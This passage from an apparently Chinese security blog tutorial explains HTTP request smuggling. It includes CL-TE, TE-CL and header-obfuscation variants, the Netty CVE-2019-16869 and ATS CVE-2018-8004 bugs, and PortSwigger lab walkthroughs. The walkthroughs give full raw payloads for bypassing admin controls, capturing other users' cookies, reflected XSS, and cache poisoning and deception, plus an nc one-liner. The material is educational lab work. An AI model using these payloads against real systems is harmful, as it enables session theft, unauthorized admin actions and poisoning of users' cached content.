数据就变得额外的重要，因为这影响到我们攻击是否成功，能否将我们的 HTTP 请求成功地“嵌入”在一个 HTTP 请求当中。 这里的计算方法与之前的类似， 12GET /secret HTTP/1.1\\r\\n --&gt; \"GET /secret HTTP/1.1\" 一共20个字符，加上CRLF一共22个字符Host: example.com\\r\\n --&gt; \"Host: example.com\" 一共17个字符，加上CRLF一共19个字符 22 + 19 = 41 个字节 Two Identical Fields - CL这里我们以 Content-Length 举例，在 RFC7230 section 3.3.2 中， If a message is received that has multiple Content-Length header fields with field-values consisting of the same decimal value, or a single Content-Length header field with a field value containing a list of identical decimal values (e.g., “Content-Length: 42, 42”), indicating that duplicate Content-Length header fields have been generated or combined by an upstream message processor, then the recipient MUST either reject the message as invalid or replace the duplicated field-values with a single valid Content-Length field containing that decimal value prior to determining the message body length or forwarding the message. And RFC 7230 section 3.3.3 中也提到： If a message is received without Transfer-Encoding and with either multiple Content-Length header fields having differing field-values or a single Content-Length header field having an invalid value, then the message framing is invalid and the recipient MUST treat it as an unrecoverable error. If this is a request message, the server MUST respond with a 400 (Bad Request) status code and then close the connection. RFC 当中对于这中情况也有了比较明确的规范，但是我们这里假设举一个比较简单的例子，我们发送以下请求： 12345678GET /suzann.html HTTP/1.1\\r\\nHost: example.com\\r\\nContent-Length: 0\\r\\nContent-Length: 46\\r\\n\\r\\nGET /walter.html HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n 在这里，我们假设 Front 服务器以第二个 Content-Length 为解析标准，抛弃第一个 Content-Length 字段或者对第一个不做任何处理或者 anything else ，反正假设它只处理第二个 Content-Length 字段；我们在假设 Backend服务器以第一个 Content-Length 字段为解析标准，不理会第二个。 这样就相当于我们在 HTTP 请求中注入了另一个 HTTP 请求，如果整个场景像我们上述这样，就存在 HTTP Smuggling 攻击。 如过服务器以第一个 Content-Length 为解析标准，这样解析就会出现两个 HTTP 请求，如果以第二个作为解析标准，则会认为只有一个 HTTP 请求。 Optional WhiteSpaceRFC7320 中对于 header 字段有这样的描述： 3.2. Header Fields Each header field consists of a case-insensitive field name followed by a colon (“:”), optional leading whitespace, the field value, and optional trailing whitespace. header-field = field-name “:” OWS field-value OWS field-name = token field-value = *( field-content / obs-fold ) field-content = field-vchar [ 1*( SP / HTAB ) field-vchar ] field-vchar = VCHAR / obs-text obs-fold = CRLF 1*( SP / HTAB ) ; obsolete line folding ; see Section 3.2.4 The field-name token labels the corresponding field-value as having the semantics defined by that header field. For example, the Date header field is defined in Section 7.1.1.2 of [RFC7231] as containing the origination timestamp for the message in which it appears. 尤其是开头的一句话表明，字段后面应该紧跟:冒号，然后是 OWS(Optional WhiteSpace) 可选的空格，然后再是字段值，最后是 OWS 可选空格。 这个会存在什么问题呢？很明显，如果有中间件对于这个的实现并没有严格遵循 RFC 标准的话，也会产生 HTTP Smuggling 攻击。 比较典型的例子就是 CVE-2019-16869 ，这枚 CVE 是 OPPO 子午互联网安全实验室发掘的，是关于 Netty 中间件存在 HTTP Smuggling 漏洞。 在 Netty 4.1.42.Final 版本之前对于 Header 头的处理是使用 splitHeader 方法，其中关键代码如下： 123456for (nameEnd = nameStart; nameEnd &lt; length; nameEnd ++) { char ch = sb.charAt(nameEnd); if (ch == ':' || Character.isWhitespace(ch)) { break; }} 其他的代码我们并不需要过多了解，这里我们可以知道这里将空格与:冒号同样处理了，也就是如果存在空格会把:其之前的 field name 正常处理，并不会抛出错误或者进行其他操作。这样就与 RFC 标准的规范不一致了，于是就会产生解析差异。 @Bi3g0 构建了比较清晰的漏洞原理图： 这里用的例子是采用 ELB 作为 Front 服务器，Netty 作为 Backend 服务器进行举例，我们发送如下请求： 12345678910POST /getusers HTTP/1.1Host: www.backend.comContent-Length: 64Transfer-Encoding : chunked0GET /hacker HTTP/1.1Host: www.hacker.comhacker: hacker ELB 会将 Transfer-Encoding 字段忽略，因为它与冒号中间有一个空格，不符合 RFC 标准，会使用 Content-Length 作为解析标准，于是会认为以上请求是一个完整的请求，继而扔给 Backend 服务器，也就是 Netty ，Netty 在这里会优先解析 Transfer-Encoding ，即使这个字段不符合 RFC 标准，但是因为它的实现方式不严格，所以这里因为优先解析 Transfer-Encoding 的原因，它会将这个请求拆分为两个请求： 123456POST /getusers HTTP/1.1Host: www.backend.comContent-Length: 64Transfer-Encoding : chunked0 123GET /hacker HTTP/1.1Host: www.hacker.comhacker: hacker 这样就造成了 HTTP Smuggling 攻击。 Netty 于 4.1.42 Final 版本修复了这个漏洞：Correctly handle whitespaces in HTTP header names as defined by RFC72… 当我们发送 field name 与 : 之间有空格的 header 请求时， netty 会“正确”地返回 400 。 CL-TE接下来几个攻击方式我们可以通过 @portswigger 提供的几个 Lab 给我们进行练习以加深理解——HTTP request smuggling 在做之前记得要把 BurpSuite 的自动更新 Content-Length 功能取消了。 首先我们来看 CL-TE 的情况：Lab: HTTP request smuggling, basic CL.TE vulnerability This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding. The front-end server rejects requests that aren’t using the GET or POST method. To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST. 根据题目提示，我们只需要让 Backend 服务器收到 GPOST 方法即可，而且场景也明确告诉我们是一种 CL-TE 的场景。 123456789POST / HTTP/1.1Host: ac8f1fae1e6cd77b8073213100b500d6.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-Length: 6Transfer-Encoding: chunked0G 根据题目的提示要求，这里我们发送两次以上 HTTP 请求包： 我们就可以使第二次请求构造出 GPOST 的 HTTP Method 了，详细的我们可以按照下面这个流程图来看看： 1234567891011User Front Backend| | ||--A(1A+1/2B)--&gt;| | | |--A(1A+1/2B)--&gt;| | |&lt;-A(200)-------|| | [1/2B]|&lt;-A(200)-------| [1/2B]|--C-----------&gt;| [1/2B]| |--C-----------&gt;| * ending B *| |&lt;--B(200)------||&lt;--B(200)------| | 1A + 1/2B 表示的是一个完整的请求 A + 一个不完整的请求 B A(X) : 表示 X 请求隐藏在 A 请求的 body 当中 ending B: 请求 C 第一行被拼接到了不完整的请求 B 的 header 头当中，请求 C 其他所有的请求头都被添加到了请求 B 当中，这样请求 C 就相当于消失了，请求 B 会带着请求 C 的请求头去请求后段服务器，包括 Cookie 字段或者其他什么认证字段 整个过程就是，我们发送以上请求，当 Front 服务器优先以 CL 处理时，会认为 1230\\r\\n\\r\\nG 以上 6 个字节为请求 A 的 body ，会将这个请求 A 当作一个完整的请求转发到后端，而当 Backend 服务器优先以 TE 处理时，会认为 1234567POST / HTTP/1.1Host: ac8f1fae1e6cd77b8073213100b500d6.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-Length: 6Transfer-Encoding: chunked0 这个是一个完整的，单独的请求，而 1G 这个他会视为一个不完整的请求，所以就造成了 1/2 B 请求的产生，于是会在 Backend 服务器缓冲区处等待其他数据的到来以使得将 1/2 B 拼接成一个完整的请求，当我们发送第二遍请求的时候，POST 会拼接到 G 后面，所以 HTTP Method 会变成 GPOST 方法，也就是我们看到的得到的回显，无法识别的 HTTP Method GPOST。 TE-CL接下来我们来看 TE-CL 的情况，同样我们借助 LAB 实验来加深理解：Lab: HTTP request smuggling, basic TE.CL vulnerability This lab involves a front-end and back-end server, and the back-end server doesn’t support chunked encoding. The front-end server rejects requests that aren’t using the GET or POST method. To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST. 按照题目提示，我们要达到的仍然是让后端收到 GPOST 请求，而且场景也明确告诉我们是一种 TE-CL 的场景。 123456789POST / HTTP/1.1Host: acde1ffc1f047f9f8007186200ff00fe.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-length: 4Transfer-Encoding: chunked12GPOST / HTTP/1.10 这里需要注意的是最后需要加两个 CRLF 构造 chunk data，也就是 120\\r\\n\\r\\n 根据题目的提示要求，这里我们发送两次以上 HTTP 请求包即可，我们可以收到如下图所示的响应。 过程流程与 CL-TE 类似，Front 服务器处理这个请求的时候按照 TE 优先处理，会认为上面的请求为一个请求整体，然后转发给 Backend 服务器，Backend 服务器在处理的时候按照 CL 优先处理，会认为12\\r\\n为第一个请求的 body ，以下为第二个请求，所以会响应 GPOST 为无法识别的 HTTP Method。 Two Identical Fields - TE这里我们来看 TE 都存在的情况，同样我们借助 LAB 实验来加深理解：Lab: HTTP request smuggling, obfuscating the TE header This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren’t using the GET or POST method. To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST. 按照题目提示，我们要达到的仍然是让后端收到 GPOST 请求，而且场景也明确告诉我们是一种 TE-TE 的场景。其实这个场景也可以认为是相同字段的场景处理，比如说在处理两个 TE 字段，如果取第二个 TE 字段作为解析标准，而第二个字段值非正常或者解析出错，就可能会忽略掉 TE 字段，而使用 CL 字段进行解析。比如在这个 LAB 中，我们发送两遍如下请求： 1234567891011121314151617POST / HTTP/1.1Host: acfd1f201f5fb528809b582e004200a3.web-security-academy.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: session=9swxitdhJRXeFhq77wGSU7fKw0VTiuzQCache-Control: max-age=0Content-length: 4Transfer-Encoding: chunkedTransfer-encoding: nothing12GPOST / HTTP/1.10 这里同上一个场景一样，需要在最后添加两个 CRLF ： 120\\r\\n\\r\\n 我们就可以得到如下图的响应： 我们可以看到这里是用了两个 TE 字段，并且第二个 TE 字段值非标准值，这里 Front 选择对第一个 TE 进行优先处理，整个请求则为正常请求，会转发给 Backend 服务器，而 Backend 服务器以第二个 TE 进行优先处理，而第二个 TE 值非正常，则会取 CL 字段进行处理，这样这个请求就会因为 CL 字段设置的值 4 而被拆分为两个请求。 第一个请求： 1234567891011121314POST / HTTP/1.1Host: acfd1f201f5fb528809b582e004200a3.web-security-academy.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: session=9swxitdhJRXeFhq77wGSU7fKw0VTiuzQCache-Control: max-age=0Content-length: 4Transfer-Encoding: chunkedTransfer-encoding: nothing12 第二个请求： 123GPOST / HTTP/1.10 这样就发送了一个无法识别的 HTTP Method GPOST 请求。 Attack Surface上面我们大概介绍了几种攻击方式，下面我来看看这些攻击方式可以用来干嘛。同样我们将配合实验环境帮助理解与复现。 Bypass Front-end Security Controls这里提供了两个实验环境，一个是 CL-TE 形式的 Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability ，一个是TE-CL 形式的 Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability，两个实验最终达到的目的一样，这里我们随便选用 CL-TE 的来进行实验。 ​ This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding. There’s an admin panel at /admin, but the front-end server blocks access to it. To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos. 架构一样，只不过这次我们需要去利用 HTTP Smuggling 获取 admin 权限并删除 carlos 用户。 我们生成 LAB 之后，直接访问/admin会发现 \"Path /admin is blocked\"，看来不能通过正常方式访问/admin，那我们尝试 HTTP Smuggling 的方式，发送如下数据包两次： 1234567891011121314POST / HTTP/1.1Host: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5aContent-Length: 28Transfer-Encoding: chunked0GET /admin HTTP/1.1 得到的响应如下两图 可以看到第二个请求我们得到了/admin的响应 123&lt;div class=\"container is-page\"&gt; Admin interface only available if logged in as an administrator, or if requested as localhost&lt;/div&gt; 于是我们添加 HOST 头再次发送几次 123456789101112131415POST / HTTP/1.1Host: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5aContent-Length: 45Transfer-Encoding: chunked0GET /admin HTTP/1.1Host: localhost 我们可以看到成功访问到了/admin面板内容，如果不成功可以多发送几次试试看 得到了删除的 api ，于是我们再利用 HTTP Smuggling 访问这个 /admin/delete?username=carlos 即可，构造如下数据包： 123456789101112131415POST / HTTP/1.1Host: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5aContent-Length: 63Transfer-Encoding: chunked0GET /admin/delete?username=carlos HTTP/1.1Host: localhost 这种攻击方式类似 HTTP SSRF ，主要的点就是在控制 CL 数值上，比如说第一个数据包 CL 的值为 28 ，是这么计算的： 12340\\r\\n --&gt; 3个字节\\r\\n --&gt; 2个字节GET /admin HTTP/1.1\\r\\n --&gt; 19+2 = 21 个字节\\r\\n --&gt; 2个字节 所以这么结算下来就是 3+2+21+2 = 28字节。 TE-CL 的情况类似，这里就不再重复举例了。 Revealing Front-end Request Rewriting ​ 在有的网络环境下，前端代理服务器在收到请求后，不会直接转发给后端服务器，而是先添加一些必要的字段，然后再转发给后端服务器。这些字段是后端服务器对请求进行处理所必须的，比如： 描述TLS连接所使用的协议和密码 包含用户IP地址的XFF头 用户的会话令牌ID 总之，如果不能获取到代理服务器添加或者重写的字段，我们走私过去的请求就不能被后端服务器进行正确的处理。那么我们该如何获取这些值呢。PortSwigger提供了一个很简单的方法，主要是三大步骤： 找一个能够将请求参数的值输出到响应中的POST请求 把该POST请求中，找到的这个特殊的参数放在消息的最后面 然后走私这一个请求，然后直接发送一个普通的请求，前端服务器对这个请求重写的一些字段就会显示出来。 有时候 Front 服务器会给转发的请求添加一些请求头再转发给 Backend 服务器，我们可以利用 HTTP Smuggling 的方式来泄露这些请求头。同样我们借助 LAB 来实践理解：Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding. There’s an admin panel at /admin, but it’s only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It’s similar to the X-Forwarded-For header but has a different name. To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos. 这里根据题目提示，场景是一个 CL-TE 的场景，并且给出一个搜索框，我们尝试随便搜索一个 123 ，可以发现搜索结果“123”直接回显到了相应当中。 尝试使用 HTTP Smuggling 方式访问，但是被 blocked ： 然后我们可以尝试利用搜索回显把 Front 服务器转发的请求头给泄露出来： 如果后面只是添加那个 X-*-Ip 的请求头是访问不了 admin 面板的，因为这样会让 Backend 收到两个重复的请求头，在这个场景当中，Backend 服务器对重复的请求头做出了判断： 所以我们需要把 Front 服务器添加的请求头给“隐藏”掉，我们就可以利用 Smuggling 通过 body 的方式把其他 Front 服务器添加的请求头“隐藏”掉，然后我们就可以得到 admin 面板回显： 整个流程看起来比较简单，但是仔细做的话，其实 CL 的值比较关键，我们来看看泄露 Front 请求的那个数据包的 CL 值怎么算的： 12345670\\r\\n --&gt; 3个字节\\r\\n --&gt; 2个字节POST / HTTP/1.1\\r\\n --&gt; 17个字节Content-Length: 70\\r\\n --&gt; 20个字节Content-Type: application/x-www-form-urlencoded\\r\\n --&gt; 49个字节\\r\\n --&gt; 2个字节search=123 --&gt; 10个字节 总共是 103 个字节，这里的 CL 也可以不是 70 ，这里只是控制泄露多少字节的内容。 还有一个比较需要注意的就是如果你不添加 Content-Type 字段的话，需要在最后添加一个\\r\\n，否则会返回 400 。 Capturing other users’ requests既然能拿到中间件请求，当然我们也可以尝试去拿其他用户的请求，也能拿到 Cookie 等，LAB 地址：Lab: Exploiting HTTP request smuggling to capture other users’ requests This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding. To solve the lab, smuggle a request to the back-end server that causes the next user’s request to be stored in the application. Then retrieve the next user’s request and use the victim user’s cookies to access their account. 原理也比较简单，我们可以找到一个发评论的地方，然后利用评论处进行 HTTP Smuggling，例如，我们可以构造以下请求包： 12345678910111213141516171819202122POST / HTTP/1.1Host: ac951f7d1e9ea625803c617f003f005c.web-security-academy.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: session=ipRivKyVnK41ZGBQk7JvtKjbD4drk2AtUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Type: application/x-www-form-urlencodedContent-Length: 271Transfer-Encoding: chunked0POST /post/comment HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 600Cookie: session=ipRivKyVnK41ZGBQk7JvtKjbD4drk2Atcsrf=oIjWmI8aLjIzqX18n5mNCnJieTnOVWPN&amp;postId=5&amp;name=1&amp;email=1%40qq.com&amp;website=http%3A%2F%2Fwww.baidu.com&amp;comment=1 只要下面这个 CL 足够大，我们就可以用 HTTP Smuggling 把下一个用户的请求拼接到我们最后一个 comment 参数里面了，然后我们在看评论处就可以看到别人的请求头了。 Exploit Reflected XSS这个利用场景可能比较受限，也比较少见，但是如果存在 HTTP Smuggling &amp; reflected XSS ，我们就可以利用这个组合拳 X 到别人的 cookie This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding. The application is also vulnerable to reflected XSS via the User-Agent header. To solve the lab, smuggle a request to the back-end server that causes the next user’s request to receive a response containing an XSS exploit that executes alert(1). 还是依旧的 CL-TE 场景，我们可以在 UA 处发现有一个反射 XSS，but 单是这样没什么用，所以我们得想点办法升级危害。 我们可以构造以下数据包，只要发送一次 1234567891011121314151617181920POST / HTTP/1.1Host: ac811f011e27d43b80301693005a0007.web-security-academy.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: session=iSxMvTrkiVN2G5N7EF7MTKgXGRE6A5xZUpgrade-Insecure-Requests: 1Content-Length: 150Transfer-Encoding: chunked0GET /post?postId=5 HTTP/1.1User-Agent: \"&gt;&lt;script&gt;alert(1)&lt;/script&gt;Content-Type: application/x-www-form-urlencodedContent-Length: 5x=1 然后我们随便访问该站任何页面都会被弹窗了，因为我们的请求被嵌入到了上面的第二个请求当中： Turn An On-Site Redirect Into An Open Redirect这种攻击场景是在目标在使用 30x 跳转的时候，使用了 Host 头进行跳转，例如在 Apache &amp; IIS 服务器上，一个uri 最后不带 / 的请求会被 30x 导向带 / 的地址，例如发送以下请求： 12GET /home HTTP/1.1Host: normal-website.com 我们会得到 Response : 12HTTP/1.1 301 Moved PermanentlyLocation: https://normal-website.com/home/ 看起来没什么危害，但是如果我们配合 HTTP Smuggling 就会有问题了，例如： 12345678910POST / HTTP/1.1Host: vulnerable-website.comContent-Length: 54Transfer-Encoding: chunked0GET /home HTTP/1.1Host: attacker-website.comFoo: X Smugle 之后的请求会像以下这样： 1234GET /home HTTP/1.1Host: attacker-website.comFoo: XGET /scripts/include.js HTTP/1.1Host: vulnerable-website.com 然后如果服务器根据 Host 进行跳转的话，我们会得到以下的 Response: 12HTTP/1.1 301 Moved PermanentlyLocation: https://attacker-website.com/home/ 这样，受害者，也就是访问/scripts/include.js这个的用户，会被跳转到我们控制的 url 了。 Perform Web Cache Poisoning这个场景也是基于上面的 Host 跳转的攻击场景，如果 Front 服务器还存在缓存静态资源的话，我们可以配合 HTTP Smuggling 进行缓存投毒，Lab: Exploiting HTTP request smuggling to perform web cache poisoning This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding. The front-end server is configured to cache certain responses. To solve the lab, perform a request smuggling attack that causes the cache to be poisoned, such that a subsequent request for a JavaScript file receives a redirection to the exploit server. 这个环境也是一个可以修改 Host 进行跳转的场景，而在/post/next?postId=2路由正好有一个跳转的 api 供我们使用，这个路由跳转到的是/post?postId=4。 根据题目描述，我们需要实现缓存投毒， 例如这里我们就选择/resources/js/tracking.js进行投毒，LAB 还给了我们制造投毒的服务，于是我们可以进行以下设置： 发送以下数据包一次： 12345678910111213141516171819202122POST / HTTP/1.1Host: ac7a1f141fadd93d801c469f005500bf.web-security-academy.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: session=f6c7ZBB52a6iedorGSywc8jM6USu4685Upgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Type: application/x-www-form-urlencodedContent-Length: 178Transfer-Encoding: chunked0GET /post/next?postId=3 HTTP/1.1Host: ac701fe61fabd97b8027465701f800a8.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-Length: 10x=1 然后访问/resources/js/tracking.js: 我们可以看到响应包的跳转地址被我们修改成了我们 exploit 的服务器地址，然后我们访问正常服务器主页试试： 可以看到成功alert(1)。 整个流程我们可以利用以下流程来理解： 12345678910111213Innocent Attacker Front Backend | | | | | |--A(1A+1/2B)--&gt;| | | | |--A(1A+1/2B)--&gt;| | | |&lt;-A(200)-------| | | | [1/2B] | |&lt;-A(200)-------| [1/2B] | |--C-----------&gt;| [1/2B] | | |--C-----------&gt;| * ending B * | | [*CP*]&lt;--B(200)----| | |&lt;--B(200)------| | |--C---------------------------&gt;| | |&lt;--B(200)--------------------[HIT] | 1A + 1/2B means request A + an incomplete query B A(X) : means X query is hidden in body of query A CP : Cache poisoning 与之前那个流程图类似，因为在 C 请求的/resources/js/tracking.js会被 Front 认为是静态资源缓存起来，而我们利用 HTTP Smuggling 将这个请求导向了我们的 exploit 服务器，返回了alert(1)给 C 请求，然后这个响应包就会被 Front 服务器缓存起来，这样我们就成功进行了投毒。 Perform Web Cache Deception其实这个场景与缓存投毒类似，但是稍有一点区别，按照比较官方的说法，缓存欺骗与缓存投毒有以下这些区别： ​ What is the difference between web cache poisoning and web cache deception? In web cache poisoning, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users. In web cache deception, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache. 在 Web 缓存投毒中，攻击者使应用程序将某些恶意内容存储在缓存中，并将该内容从缓存中提供给其他应用程序用户。在Web缓存欺骗中，攻击者使应用程序将一些属于另一个用户的敏感内容存储在缓存中，然后攻击者从缓存中检索该内容。 这个我们就不配合 Lab: Exploiting HTTP request smuggling to perform web cache deception 来做了，因为 LAB 提供的环境 victim 有点问题。 我们可以这么理解，我们发送如下 HTTP 请求： 123456789POST / HTTP/1.1Host: vulnerable-website.comContent-Length: 43Transfer-Encoding: chunked0GET /private/messages HTTP/1.1Foo: X 该 Smugle 的请求会用Foo: X吃掉下一个发过来的请求头的第一行，也就是GET /xxx HTTP/1.1那一行，并且这个请求还会带着用户的 Cookie 去访问，类似于一个CSRF，该请求变成了以下请求头： 1234GET /private/messages HTTP/1.1Foo: XGET /static/some-image.png HTTP/1.1Host: vulnerable-website.comCookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z 只要我们多发送几次，一旦用户访问的是静态资源，就可能会被 Front 服务器缓存起来，我们就可以拿到用户/private/messages的信息了。这里可能需要大量的重复发包，因为需要构造让静态资源缓存，还是需要一定运气的。 至此，HTTP Smuggling 的基本攻击面都已经介绍完毕了。 Real WorldPaypal首先肯定得来聊聊今年分享 HTTP Smuggling 的作者在 Black Hat 上分享的 Paypal 漏洞实例了 作者首先通过 HTTP Smuggling 的方式将一个用于 Paypal 登录的 js 文件进行了投毒： 123456789101112131415POST /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1 Host: c.paypal.comContent-Length: 61 Transfer-Encoding: chunked0GET /webstatic HTTP/1.1Host: skeletonscribe.net?X: XGET /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1 Host: c.paypal.comConnection: closeHTTP/1.1 302 FoundLocation: http://skeletonscribe.net?, c.paypal.com/webstatic/ 但是 Paypal 登录页面有 CSP 规则 script-src 限制了这个跳转。 后来作者发现该页面还有一个动态生成的 iframe 引入了 c.paypal.com ，且该子页面没有 CSP 而且还引入了作者投毒的 js 文件！虽然这样可以控制 iframe 页面，但是由于同源策略，是读不到父页面的数据的。 再接着作者的同事在 paypal.com/us/gifts 发现了一个不使用 CSP 的页面，并且也导入了作者投毒的 js 文件，这样作者终于通过 js 将 c.paypal.com 的 iframe 重定向到了 paypal.com/us/gifts ，这样就同源了，也就可以读取父页面的数据了。 Paypal 第一次修复是将 Akamai 配置修改成拒绝含有 Transfer-Encoding: chunked 的请求，但是后来又被作者构造了一个换行的 header 绕过了： 12Transfer-Encoding: chunked ATS ​ Apache Traffic Server（ATS）是美国阿帕奇（Apache）软件基金会的一款高效、可扩展的HTTP代理和缓存服务器。 Apache ATS 6.0.0版本至6.2.2版本和7.0.0版本至7.1.3版本中存在安全漏洞。攻击者可利用该漏洞实施HTTP请求走私攻击或造成缓存中毒。 在美国国家信息安全漏洞库中，我们可以找到关于该漏洞的四个补丁，接下来我们详细看一下。 CVE-2018-8004 补丁列表 https://github.com/apache/trafficserver/pull/3192 https://github.com/apache/trafficserver/pull/3201 https://github.com/apache/trafficserver/pull/3231 https://github.com/apache/trafficserver/pull/3251 注：虽然漏洞通告中描述该漏洞影响范围到7.1.3版本，但从github上补丁归档的版本中看，在7.1.3版本中已经修复了大部分的漏洞。 关于这四个补丁的分析与复现我觉得 @mengchen 师傅已经写的非常详细了，我就不在赘述了，建议看原文部分 HTTP走私攻击实例——CVE-2018-8004 这里我们说一下原文没有的部分： 1234567891011121314[dummy-host7.example.com] | +-[8080]-----+ | 8007-&gt;8080 | | ATS7 | | | +-----+------+ | | +--[80]----+ | 8002-&gt;80 | | Nginx | | | +----------+ 我们构建以上场景，可以使用我搭建的 docker 实验环境 lab1 Request Splitting using Huge Header我们可以通过使用 65535 个字符的 header 来进行实验，比如说我们可以通过使用以下代码来发送一个含有 65535 个字符的 header 的请求到 ATS 7: 12345678printf 'GET_/something.html?zorg2=5_HTTP/1.1\\r\\n'\\'Host:_dummy-host7.example.com\\r\\n'\\'X:_\"%65534s\"\\r\\n'\\'GET_http://dummy-host7.example.com/index.html?replaced=0&amp;cache=8_HTTP/1.1\\r\\n'\\'\\r\\n'\\|tr \" \" \"1\"\\|tr \"_\" \" \"\\|nc -q 1 127.0.0.1 8007 nginx 的返回会直接返回 400 错误，但是有 ATS 7 就比较有趣了，我们会得到一个 400 响应以及 ATS 7 的 200 响应 1234567891011121314151617181920212223HTTP/1.1 400 Invalid HTTP RequestDate: Fri, 29 Nov 2019 18:52:42 GMTConnection: keep-aliveServer: ATS/7.1.1Cache-Control: no-storeContent-Type: text/htmlContent-Language: enContent-Length: 220&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;Bad Request&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY BGCOLOR=\"white\" FGCOLOR=\"black\"&gt;&lt;H1&gt;Bad Request&lt;/H1&gt;&lt;HR&gt;&lt;FONT FACE=\"Helvetica,Arial\"&gt;&lt;B&gt;Description: Could not process this request.&lt;/B&gt;&lt;/FONT&gt;&lt;HR&gt;&lt;/BODY&gt; 123456789101112131415161718HTTP/1.1 200 OKServer: ATS/7.1.1Date: Fri, 29 Nov 2019 18:52:42 GMTContent-Type: text/htmlContent-Length: 119Last-Modified: Fri, 29 Nov 2019 05:37:09 GMTETag: \"5de0ae85-77\"X-Location-echo: /index.html?replaced=0&amp;cache=8X-Default-VH: 0Cache-Control: public, max-age=300Accept-Ranges: bytesAge: 0Connection: keep-alive&lt;html&gt;&lt;head&gt;&lt;title&gt;Nginx default static page&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Hello World&lt;/h1&gt;&lt;p&gt;It works!&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 